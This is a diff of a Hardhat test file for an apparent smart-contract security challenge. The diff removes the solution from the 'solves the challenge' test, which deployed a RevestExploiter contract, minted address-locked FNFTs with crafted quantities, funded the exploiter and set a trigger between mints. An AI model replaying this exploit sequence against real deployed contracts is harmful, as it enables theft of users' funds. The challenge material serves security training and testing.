@@ -67,28 +67,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  let exploiterFactory = await ethers.getContractFactory('RevestExploiter')
-  let exploiter = await exploiterFactory.connect(attacker).deploy(revest.address,gov.address)
-
-  await revest.connect(attacker).mintAddressLock( // fnftId=1
-    exploiter.address,
-    ethers.constants.HashZero,
-    [exploiter.address],
-    [2],
-    {asset:gov.address,depositAmount:0,depositMul:0}
-  )
-
-  await gov.connect(attacker).transfer(exploiter.address, precision.mul(1))
-  await exploiter.connect(attacker).setTrigger(true)
-
-  await revest.connect(attacker).mintAddressLock( // fnftId=2
-    exploiter.address,
-    ethers.constants.HashZero,
-    [exploiter.address],
-    [100_001],
-    {asset:gov.address,depositAmount:0,depositMul:0}
-  )
-
 });
 
 /// expected final state
